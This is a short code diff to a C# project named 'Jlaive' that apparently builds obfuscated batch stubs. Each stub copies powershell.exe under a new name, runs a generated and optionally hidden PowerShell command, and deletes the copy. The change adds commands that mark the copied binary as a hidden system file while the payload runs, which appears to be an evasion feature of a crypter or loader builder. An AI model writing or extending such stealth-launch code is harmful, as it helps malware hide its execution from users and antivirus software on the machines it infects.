@@ -71,8 +71,10 @@ namespace Jlaive
             string command = StubGen.CreatePS(key, hidden.Checked, rng);
             StringBuilder toobf = new StringBuilder();
             toobf.AppendLine(@"echo F|xcopy C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe pshell.exe /y");
+            toobf.AppendLine("attrib +s +h pshell.exe");
             toobf.AppendLine("cls");
             toobf.AppendLine(command);
+            toobf.AppendLine("attrib -s -h pshell.exe");
             toobf.Append("del pshell.exe");
             StringBuilder output = new StringBuilder();
             output.AppendLine("@echo off");
